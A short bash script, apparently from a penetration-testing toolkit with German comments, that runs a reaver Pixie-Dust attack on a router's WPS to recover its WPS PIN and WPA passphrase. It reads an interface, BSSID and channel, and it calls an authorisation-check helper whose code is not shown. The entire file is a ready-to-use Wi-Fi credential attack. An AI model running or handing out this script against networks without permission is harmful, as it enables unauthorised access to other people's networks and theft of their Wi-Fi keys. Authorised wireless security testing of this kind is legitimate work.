#!/usr/bin/env bash
# wps-pixiedust.sh - Pixie-Dust offline-Attack auf WPS (sehr schnell wenn vulnerable)
set -euo pipefail

TOOLKIT="${TOOLKIT:-/mnt/toolkit}"
source "$TOOLKIT/scripts/lib/logging.sh"
source "$TOOLKIT/scripts/lib/auth_check.sh"

IFACE="${1:-}"
BSSID="${2:-}"
CH="${3:-}"
[[ -z "$IFACE" || -z "$BSSID" || -z "$CH" ]] && {
    echo "Usage: $0 <monitor_iface> <bssid> <channel>"
    exit 1
}
require_auth "$BSSID"

require_bin reaver

outdir="$(make_outdir captures pixie-${BSSID//:/})"
log_info "Pixie-Dust auf $BSSID (ch $CH)"

sudo reaver -i "$IFACE" -b "$BSSID" -c "$CH" -K 1 -vv \
    -o "$outdir/pixie.log" 2>&1 | tee "$outdir/pixie-stdout.log" || true

if grep -qE 'WPS PIN|WPA PSK' "$outdir/pixie.log" 2>/dev/null; then
    log_ok "Erfolg! Siehe $outdir/pixie.log"
else
    log_warn "Kein Erfolg - Router vermutlich gepatcht."
fi
